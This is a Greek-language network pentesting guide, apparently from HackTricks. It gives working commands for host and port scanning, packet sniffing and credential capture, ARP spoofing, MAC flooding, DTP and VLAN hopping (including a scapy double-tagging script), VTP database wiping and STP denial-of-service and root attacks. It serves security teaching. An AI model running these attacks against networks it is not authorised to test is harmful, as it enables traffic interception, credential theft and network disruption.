# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Ανακάλυψη hosts από το εξωτερικό

Αυτή θα είναι μια **σύντομη ενότητα** σχετικά με το πώς να βρείτε **IPs που απαντούν** από το **Διαδίκτυο**.\
Σε αυτή την περίπτωση έχετε κάποιο **εύρος IPs** (ίσως ακόμη και αρκετές **σειρές**) και πρέπει απλώς να βρείτε **ποια IPs απαντούν**.

### ICMP

Αυτή είναι η **ευκολότερη** και **ταχύτερη** μέθοδος για να ανακαλύψετε αν ένας host είναι ενεργός ή όχι.\
Μπορείτε να προσπαθήσετε να στείλετε κάποια **ICMP** πακέτα και να **περιμένετε απαντήσεις**. Ο ευκολότερος τρόπος είναι να στείλετε ένα **echo request** και να περιμένετε την απάντηση. Μπορείτε να το κάνετε αυτό χρησιμοποιώντας ένα απλό `ping` ή χρησιμοποιώντας `fping` για **σειρές**.\
Μπορείτε επίσης να χρησιμοποιήσετε το **nmap** για να στείλετε άλλους τύπους ICMP πακέτων (αυτό θα αποφύγει φίλτρα για κοινές αιτήσεις-απαντήσεις ICMP echo).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Είναι πολύ συνηθισμένο να διαπιστώνουμε ότι όλα τα είδη πακέτων ICMP φιλτράρονται. Έτσι, το μόνο που μπορείτε να κάνετε για να ελέγξετε αν ένας υπολογιστής είναι ενεργός είναι να **προσπαθήσετε να βρείτε ανοιχτές θύρες**. Κάθε υπολογιστής έχει **65535 θύρες**, οπότε, αν έχετε ένα "μεγάλο" πεδίο, **δεν μπορείτε** να ελέγξετε αν **κάθε θύρα** κάθε υπολογιστή είναι ανοιχτή ή όχι, αυτό θα πάρει πολύ χρόνο.\
Έτσι, αυτό που χρειάζεστε είναι ένας **γρήγορος σαρωτής θύρας** ([masscan](https://github.com/robertdavidgraham/masscan)) και μια λίστα με τις **πιο χρησιμοποιούμενες θύρες:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Μπορείτε επίσης να εκτελέσετε αυτό το βήμα με το `nmap`, αλλά είναι πιο αργό και κάπως το `nmap` έχει προβλήματα με την αναγνώριση των ενεργών hosts.

### HTTP Port Discovery

Αυτή είναι απλώς μια ανακάλυψη TCP port που είναι χρήσιμη όταν θέλετε να **εστιάσετε στην ανακάλυψη των HTTP** **υπηρεσιών**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Μπορείτε επίσης να προσπαθήσετε να ελέγξετε αν κάποια **UDP θύρα είναι ανοιχτή** για να αποφασίσετε αν θα **δώσετε περισσότερη προσοχή** σε έναν **host.** Δεδομένου ότι οι υπηρεσίες UDP συνήθως **δεν απαντούν** με **κανένα δεδομένο** σε ένα κανονικό κενό πακέτο UDP, είναι δύσκολο να πούμε αν μια θύρα φιλτράρεται ή είναι ανοιχτή. Ο ευκολότερος τρόπος για να το αποφασίσετε είναι να στείλετε ένα πακέτο σχετικό με την τρέχουσα υπηρεσία, και καθώς δεν γνωρίζετε ποια υπηρεσία εκτελείται, θα πρέπει να δοκιμάσετε την πιο πιθανή με βάση τον αριθμό της θύρας:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Η γραμμή nmap που προτάθηκε προηγουμένως θα δοκιμάσει τα **top 1000 UDP ports** σε κάθε host μέσα στο **/24** εύρος, αλλά ακόμα και μόνο αυτό θα πάρει **>20min**. Αν χρειάζεστε **ταχύτερα αποτελέσματα**, μπορείτε να χρησιμοποιήσετε [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Αυτό θα στείλει αυτές τις **UDP probes** στο **αναμενόμενο port** τους (για ένα /24 εύρος αυτό θα πάρει μόνο 1 λεπτό): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Εδώ μπορείτε να βρείτε έναν ωραίο οδηγό για όλες τις γνωστές επιθέσεις Wifi την εποχή της συγγραφής:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Discovering hosts from the inside

Αν βρίσκεστε μέσα στο δίκτυο, ένα από τα πρώτα πράγματα που θα θέλετε να κάνετε είναι να **ανακαλύψετε άλλους hosts**. Ανάλογα με **πόσο θόρυβο** μπορείτε/θέλετε να κάνετε, μπορούν να εκτελούνται διαφορετικές ενέργειες:

### Passive

Μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να ανακαλύψετε παθητικά hosts μέσα σε ένα συνδεδεμένο δίκτυο:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ενεργό

Σημειώστε ότι οι τεχνικές που σχολιάστηκαν στο [_**Ανακαλύπτοντας hosts από έξω**_](#discovering-hosts-from-the-outside) (_Ανακάλυψη Θυρών TCP/HTTP/UDP/SCTP_) μπορούν επίσης να **εφαρμοστούν εδώ**.\
Αλλά, καθώς βρίσκεστε στο **ίδιο δίκτυο** με τους άλλους hosts, μπορείτε να κάνετε **περισσότερα πράγματα**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Σημειώστε ότι οι τεχνικές που σχολιάστηκαν στο _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) μπορούν επίσης να **εφαρμοστούν εδώ**.\
Αλλά, καθώς βρίσκεστε στο **ίδιο δίκτυο** με τους άλλους hosts, μπορείτε να κάνετε **περισσότερα πράγματα**:

- Αν **ping** ένα **subnet broadcast address**, το ping θα πρέπει να φτάσει σε **κάθε host** και αυτοί θα μπορούσαν να **απαντήσουν** σε **εσάς**: `ping -b 10.10.5.255`
- Κάνοντας ping στο **network broadcast address**, θα μπορούσατε ακόμη να βρείτε hosts μέσα σε **άλλα subnets**: `ping -b 255.255.255.255`
- Χρησιμοποιήστε τις σημαίες `-PE`, `-PP`, `-PM` του `nmap` για να εκτελέσετε ανακάλυψη hosts στέλνοντας αντίστοιχα **ICMPv4 echo**, **timestamp**, και **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Το Wake On Lan χρησιμοποιείται για να **ενεργοποιήσει** υπολογιστές μέσω ενός **δικτυακού μηνύματος**. Το μαγικό πακέτο που χρησιμοποιείται για να ενεργοποιήσει τον υπολογιστή είναι μόνο ένα πακέτο όπου παρέχεται μια **MAC Dst** και στη συνέχεια επαναλαμβάνεται **16 φορές** μέσα στο ίδιο πακέτο.\
Στη συνέχεια, αυτά τα είδη πακέτων συνήθως αποστέλλονται σε ένα **ethernet 0x0842** ή σε ένα **UDP πακέτο στην πόρτα 9**.\
Αν **δεν παρέχεται \[MAC]**, το πακέτο αποστέλλεται σε **broadcast ethernet** (και η broadcast MAC θα είναι αυτή που επαναλαμβάνεται).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Σάρωση Φιλοξενουμένων

Αφού έχετε ανακαλύψει όλες τις διευθύνσεις IP (εξωτερικές ή εσωτερικές) που θέλετε να σαρώσετε σε βάθος, μπορούν να εκτελούνται διάφορες ενέργειες.

### TCP

- **Ανοιχτή** θύρα: _SYN --> SYN/ACK --> RST_
- **Κλειστή** θύρα: _SYN --> RST/ACK_
- **Φιλτραρισμένη** θύρα: _SYN --> \[NO RESPONSE]_
- **Φιλτραρισμένη** θύρα: _SYN --> ICMP μήνυμα_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Υπάρχουν 2 επιλογές για να σαρώσετε μια θύρα UDP:

- Στείλτε ένα **UDP packet** και ελέγξτε για την απάντηση _**ICMP unreachable**_ αν η θύρα είναι **κλειστή** (σε πολλές περιπτώσεις το ICMP θα είναι **φιλτραρισμένο** οπότε δεν θα λάβετε καμία πληροφορία αν η θύρα είναι κλειστή ή ανοιχτή).
- Στείλτε **formatted datagrams** για να προκαλέσετε μια απάντηση από μια **υπηρεσία** (π.χ., DNS, DHCP, TFTP και άλλες, όπως αναφέρονται στο _nmap-payloads_). Αν λάβετε μια **απάντηση**, τότε η θύρα είναι **ανοιχτή**.

**Nmap** θα **μειγνύει και τις δύο** επιλογές χρησιμοποιώντας "-sV" (οι σαρώσεις UDP είναι πολύ αργές), αλλά σημειώστε ότι οι σαρώσεις UDP είναι πιο αργές από τις σαρώσεις TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** έχει σχεδιαστεί για να χρησιμοποιείται παράλληλα με **TCP (Transmission Control Protocol)** και **UDP (User Datagram Protocol)**. Ο κύριος σκοπός του είναι να διευκολύνει τη μεταφορά τηλεφωνικών δεδομένων μέσω δικτύων IP, αντικατοπτρίζοντας πολλές από τις δυνατότητες αξιοπιστίας που βρίσκονται στο **Signaling System 7 (SS7)**. **SCTP** είναι ένα βασικό συστατικό της οικογένειας πρωτοκόλλων **SIGTRAN**, η οποία στοχεύει στη μεταφορά σημάτων SS7 μέσω δικτύων IP.

Η υποστήριξη για **SCTP** παρέχεται από διάφορα λειτουργικά συστήματα, όπως **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, και **VxWorks**, υποδεικνύοντας την ευρεία αποδοχή και χρησιμότητά του στον τομέα των τηλεπικοινωνιών και των δικτύων.

Δύο διαφορετικές σάρωσεις για το SCTP προσφέρονται από το nmap: _-sY_ και _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS και IPS αποφυγή

{{#ref}}
ids-evasion.md
{{#endref}}

### **Περισσότερες επιλογές nmap**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Αποκάλυψη Εσωτερικών Διευθύνσεων IP

**Κακώς ρυθμισμένοι δρομολογητές, τείχη προστασίας και συσκευές δικτύου** μερικές φορές απαντούν σε δίκτυα χρησιμοποιώντας **μη δημόσιες διευθύνσεις προέλευσης**. **tcpdump** μπορεί να χρησιμοποιηθεί για να εντοπίσει πακέτα που λαμβάνονται από ιδιωτικές διευθύνσεις κατά τη διάρκεια της δοκιμής. Συγκεκριμένα, στο Kali Linux, τα πακέτα μπορούν να καταγραφούν στη **διεύθυνση eth2**, η οποία είναι προσβάσιμη από το δημόσιο Διαδίκτυο. Είναι σημαντικό να σημειωθεί ότι αν η ρύθμισή σας είναι πίσω από NAT ή τείχος προστασίας, τέτοια πακέτα είναι πιθανό να φιλτράρονται.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Με το Sniffing μπορείτε να μάθετε λεπτομέρειες σχετικά με τις περιοχές IP, τα μεγέθη υποδικτύων, τις διευθύνσεις MAC και τα ονόματα υπολογιστών αναθεωρώντας τα κατεχόμενα πλαίσια και πακέτα. Εάν το δίκτυο είναι κακώς διαμορφωμένο ή το switching fabric είναι υπό πίεση, οι επιτιθέμενοι μπορούν να συλλάβουν ευαίσθητο υλικό μέσω παθητικού network sniffing.

Εάν ένα δίκτυο Ethernet με διακόπτη είναι σωστά διαμορφωμένο, θα βλέπετε μόνο broadcast frames και υλικό που προορίζεται για τη διεύθυνση MAC σας.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Μπορεί κανείς, επίσης, να συλλάβει πακέτα από μια απομακρυσμένη μηχανή μέσω μιας συνεδρίας SSH με το Wireshark ως GUI σε πραγματικό χρόνο.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Προφανώς.

### Capturing credentials

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) για να αναλύσετε διαπιστευτήρια από ένα pcap ή μια ζωντανή διεπαφή.

## LAN attacks

### ARP spoofing

Το ARP Spoofing συνίσταται στην αποστολή δωρεάν ARPResponses για να υποδείξει ότι η IP μιας μηχανής έχει το MAC της συσκευής μας. Στη συνέχεια, το θύμα θα αλλάξει τον πίνακα ARP και θα επικοινωνήσει με τη μηχανή μας κάθε φορά που θέλει να επικοινωνήσει με την IP που έχει spoofed.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Πλημμυρίστε τον πίνακα CAM του διακόπτη στέλνοντας πολλά πακέτα με διαφορετικές διευθύνσεις mac προέλευσης. Όταν ο πίνακας CAM είναι γεμάτος, ο διακόπτης αρχίζει να συμπεριφέρεται σαν κόμβος (εκπέμποντας όλη την κίνηση).
```bash
macof -i <interface>
```
Σε σύγχρονες συσκευές, αυτή η ευπάθεια έχει διορθωθεί.

### 802.1Q VLAN / DTP Επιθέσεις

#### Δυναμική Τρούκ

Το **Dynamic Trunking Protocol (DTP)** έχει σχεδιαστεί ως πρωτόκολλο επιπέδου σύνδεσης για να διευκολύνει ένα αυτόματο σύστημα τρούκ, επιτρέποντας στους διακόπτες να επιλέγουν αυτόματα θύρες για λειτουργία τρούκ (Trunk) ή μη τρούκ. Η ανάπτυξη του **DTP** συχνά θεωρείται ένδειξη υποβέλτιστης σχεδίασης δικτύου, υπογραμμίζοντας τη σημασία της χειροκίνητης ρύθμισης των τρούκ μόνο όπου είναι απαραίτητο και της διασφάλισης κατάλληλης τεκμηρίωσης.

Από προεπιλογή, οι θύρες του διακόπτη είναι ρυθμισμένες να λειτουργούν σε λειτουργία Dynamic Auto, πράγμα που σημαίνει ότι είναι έτοιμες να ξεκινήσουν τρούκ αν ζητηθεί από έναν γειτονικό διακόπτη. Ένα ζήτημα ασφαλείας προκύπτει όταν ένας pentester ή επιτιθέμενος συνδέεται στον διακόπτη και στέλνει ένα DTP Desirable frame, αναγκάζοντας τη θύρα να εισέλθει σε λειτουργία τρούκ. Αυτή η ενέργεια επιτρέπει στον επιτιθέμενο να απαριθμήσει τα VLAN μέσω ανάλυσης STP frame και να παρακάμψει τον κατακερματισμό VLAN δημιουργώντας εικονικές διεπαφές.

Η παρουσία του DTP σε πολλούς διακόπτες από προεπιλογή μπορεί να εκμεταλλευτεί από αντιπάλους για να μιμηθούν τη συμπεριφορά ενός διακόπτη, αποκτώντας έτσι πρόσβαση στην κίνηση σε όλα τα VLAN. Το σενάριο [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) χρησιμοποιείται για την παρακολούθηση μιας διεπαφής, αποκαλύπτοντας αν ένας διακόπτης είναι σε Default, Trunk, Dynamic, Auto ή Access mode—η τελευταία είναι η μόνη ρύθμιση που είναι ανθεκτική σε επιθέσεις VLAN hopping. Αυτό το εργαλείο αξιολογεί την κατάσταση ευπάθειας του διακόπτη.

Εάν εντοπιστεί ευπάθεια δικτύου, το εργαλείο _**Yersinia**_ μπορεί να χρησιμοποιηθεί για να "ενεργοποιήσει το τρούκ" μέσω του πρωτοκόλλου DTP, επιτρέποντας την παρακολούθηση πακέτων από όλα τα VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Για να καταμετρήσετε τα VLANs, είναι επίσης δυνατό να δημιουργήσετε το πλαίσιο DTP Desirable με το σενάριο [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Μ**η διακόψετε το σενάριο υπό οποιεσδήποτε συνθήκες. Εισάγει DTP Desirable κάθε τρία δευτερόλεπτα. **Οι δυναμικά δημιουργημένοι κορμοί στο switch ζουν μόνο για πέντε λεπτά. Μετά από πέντε λεπτά, ο κορμός αποσυνδέεται.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Θα ήθελα να επισημάνω ότι το **Access/Desirable (0x03)** υποδεικνύει ότι το DTP frame είναι του τύπου Desirable, το οποίο λέει στην θύρα να αλλάξει σε Trunk mode. Και το **802.1Q/802.1Q (0xa5)** υποδεικνύει τον τύπο encapsulation **802.1Q**.

Αναλύοντας τα STP frames, **μαθαίνουμε για την ύπαρξη των VLAN 30 και VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Επίθεση σε συγκεκριμένα VLANs

Μόλις γνωρίζετε τις τιμές VLAN IDs και IPs, μπορείτε να **ρυθμίσετε μια εικονική διεπαφή για να επιτεθείτε σε ένα συγκεκριμένο VLAN**.\
Εάν το DHCP δεν είναι διαθέσιμο, τότε χρησιμοποιήστε _ifconfig_ για να ορίσετε μια στατική διεύθυνση IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Αυτόματος VLAN Hopper

Η συζητηθείσα επίθεση του **Dynamic Trunking και της δημιουργίας εικονικών διεπαφών για την ανακάλυψη hosts μέσα** σε άλλες VLAN εκτελείται **αυτόματα** από το εργαλείο: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Διπλή Ετικέτα

Εάν ένας επιτιθέμενος γνωρίζει την τιμή του **MAC, IP και VLAN ID του θύματος**, θα μπορούσε να προσπαθήσει να **διπλή ετικέτα ένα πλαίσιο** με την καθορισμένη VLAN του και τη VLAN του θύματος και να στείλει ένα πακέτο. Καθώς το **θύμα δεν θα μπορεί να συνδεθεί πίσω** με τον επιτιθέμενο, η **καλύτερη επιλογή για τον επιτιθέμενο είναι να επικοινωνήσει μέσω UDP** με πρωτόκολλα που μπορούν να εκτελέσουν κάποιες ενδιαφέρουσες ενέργειες (όπως το SNMP).

Μια άλλη επιλογή για τον επιτιθέμενο είναι να εκκινήσει μια **σάρωση TCP port spoofing μια IP που ελέγχεται από τον επιτιθέμενο και είναι προσβάσιμη από το θύμα** (πιθανώς μέσω διαδικτύου). Στη συνέχεια, ο επιτιθέμενος θα μπορούσε να καταγράψει στο δεύτερο host που κατέχει αν λάβει κάποια πακέτα από το θύμα.

![](<../../images/image (190).png>)

Για να εκτελέσετε αυτήν την επίθεση μπορείτε να χρησιμοποιήσετε το scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Αν έχετε **πρόσβαση σε έναν διακόπτη στον οποίο είστε άμεσα συνδεδεμένοι**, έχετε τη δυνατότητα να **παρακάμψετε την τμηματοποίηση VLAN** εντός του δικτύου. Απλά **αλλάξτε τη θύρα σε λειτουργία trunk** (γνωστή και ως trunk), δημιουργήστε εικονικές διεπαφές με τα IDs των στοχευμένων VLAN, και ρυθμίστε μια διεύθυνση IP. Μπορείτε να προσπαθήσετε να ζητήσετε τη διεύθυνση δυναμικά (DHCP) ή μπορείτε να την ρυθμίσετε στατικά. Εξαρτάται από την περίπτωση.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

Σε ορισμένα περιβάλλοντα, όπως τα δίκτυα ασύρματης πρόσβασης για επισκέπτες, εφαρμόζονται ρυθμίσεις **απομόνωσης θυρών (γνωστές και ως private VLAN)** για να αποτρέψουν τους πελάτες που είναι συνδεδεμένοι σε ένα ασύρματο σημείο πρόσβασης από το να επικοινωνούν άμεσα μεταξύ τους. Ωστόσο, έχει εντοπιστεί μια τεχνική που μπορεί να παρακάμψει αυτά τα μέτρα απομόνωσης. Αυτή η τεχνική εκμεταλλεύεται είτε την έλλειψη ACL δικτύου είτε την εσφαλμένη τους ρύθμιση, επιτρέποντας στα πακέτα IP να δρομολογούνται μέσω ενός δρομολογητή για να φτάσουν σε έναν άλλο πελάτη στο ίδιο δίκτυο.

Η επίθεση εκτελείται δημιουργώντας ένα **πακέτο που φέρει τη διεύθυνση IP του προορισμού πελάτη αλλά με τη MAC διεύθυνση του δρομολογητή**. Αυτό προκαλεί στον δρομολογητή να προωθήσει λανθασμένα το πακέτο στον στοχευμένο πελάτη. Αυτή η προσέγγιση είναι παρόμοια με αυτή που χρησιμοποιείται στις επιθέσεις Double Tagging, όπου η ικανότητα ελέγχου ενός host προσβάσιμου από το θύμα χρησιμοποιείται για να εκμεταλλευτεί την ασφάλεια.

**Βασικά Βήματα της Επίθεσης:**

1. **Δημιουργία Πακέτου:** Ένα πακέτο δημιουργείται ειδικά για να περιλαμβάνει τη διεύθυνση IP του στοχευμένου πελάτη αλλά με τη MAC διεύθυνση του δρομολογητή.
2. **Εκμετάλλευση Συμπεριφοράς Δρομολογητή:** Το δημιουργημένο πακέτο αποστέλλεται στον δρομολογητή, ο οποίος, λόγω της ρύθμισης, ανακατευθύνει το πακέτο στον στοχευμένο πελάτη, παρακάμπτοντας την απομόνωση που παρέχεται από τις ρυθμίσεις private VLAN.

### VTP Attacks

Το VTP (VLAN Trunking Protocol) κεντρικοποιεί τη διαχείριση VLAN. Χρησιμοποιεί αριθμούς αναθεώρησης για να διατηρεί την ακεραιότητα της βάσης δεδομένων VLAN. Οποιαδήποτε τροποποίηση αυξάνει αυτόν τον αριθμό. Οι διακόπτες υιοθετούν ρυθμίσεις με υψηλότερους αριθμούς αναθεώρησης, ενημερώνοντας τις δικές τους βάσεις δεδομένων VLAN.

#### VTP Domain Roles

- **VTP Server:** Διαχειρίζεται τα VLAN—δημιουργεί, διαγράφει, τροποποιεί. Διαδίδει ανακοινώσεις VTP στα μέλη του τομέα.
- **VTP Client:** Λαμβάνει ανακοινώσεις VTP για να συγχρονίσει τη βάση δεδομένων VLAN του. Αυτός ο ρόλος περιορίζεται από τροποποιήσεις ρυθμίσεων VLAN τοπικά.
- **VTP Transparent:** Δεν συμμετέχει σε ενημερώσεις VTP αλλά προωθεί τις ανακοινώσεις VTP. Δεν επηρεάζεται από επιθέσεις VTP, διατηρεί έναν σταθερό αριθμό αναθεώρησης μηδέν.

#### VTP Advertisement Types

- **Summary Advertisement:** Διαδίδεται από τον VTP server κάθε 300 δευτερόλεπτα, μεταφέροντας βασικές πληροφορίες τομέα.
- **Subset Advertisement:** Αποστέλλεται μετά από αλλαγές στη ρύθμιση VLAN.
- **Advertisement Request:** Εκδίδεται από έναν VTP client για να ζητήσει μια Summary Advertisement, συνήθως ως απάντηση στην ανίχνευση υψηλότερου αριθμού αναθεώρησης ρύθμισης.

Οι ευπάθειες VTP εκμεταλλεύονται αποκλειστικά μέσω θυρών trunk καθώς οι ανακοινώσεις VTP κυκλοφορούν μόνο μέσω αυτών. Μετά από σενάρια επίθεσης DTP, μπορεί να στραφούν προς το VTP. Εργαλεία όπως το Yersinia μπορούν να διευκολύνουν επιθέσεις VTP, στοχεύοντας να διαγράψουν τη βάση δεδομένων VLAN, διαταράσσοντας αποτελεσματικά το δίκτυο.

Σημείωση: Αυτή η συζήτηση αφορά την έκδοση VTP 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Στη γραφική λειτουργία του Yersinia, επιλέξτε την επιλογή διαγραφής όλων των VTP vlans για να καθαρίσετε τη βάση δεδομένων VLAN.

### STP Επιθέσεις

**Εάν δεν μπορείτε να συλλάβετε τα πακέτα BPDU στις διεπαφές σας, είναι απίθανο να πετύχετε σε μια επίθεση STP.**

#### **STP BPDU DoS**

Αποστέλλοντας πολλά BPDUs TCP (Topology Change Notification) ή Conf (τα BPDUs που αποστέλλονται όταν δημιουργείται η τοπολογία), οι διακόπτες υπερφορτώνονται και σταματούν να λειτουργούν σωστά.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Όταν αποστέλλεται ένα TCP, ο πίνακας CAM των διακοπτών θα διαγραφεί σε 15 δευτερόλεπτα. Στη συνέχεια, αν στέλνετε συνεχώς αυτού του είδους τα πακέτα, ο πίνακας CAM θα επανεκκινείται συνεχώς (ή κάθε 15 δευτερόλεπτα) και όταν επανεκκινείται, ο διακόπτης συμπεριφέρεται ως κόμβος.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Ο επιτιθέμενος προσομοιώνει τη συμπεριφορά ενός διακόπτη για να γίνει ο STP root του δικτύου. Στη συνέχεια, περισσότερα δεδομένα θα περάσουν μέσω αυτού. Αυτό είναι ενδιαφέρον όταν είστε συνδεδεμένοι σε δύο διαφορετικούς διακόπτες.\
Αυτό γίνεται στέλνοντας πακέτα BPDUs CONF που δηλώνουν ότι η τιμή **προτεραιότητας** είναι μικρότερη από την πραγματική προτεραιότητα του πραγματικού διακόπτη root.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
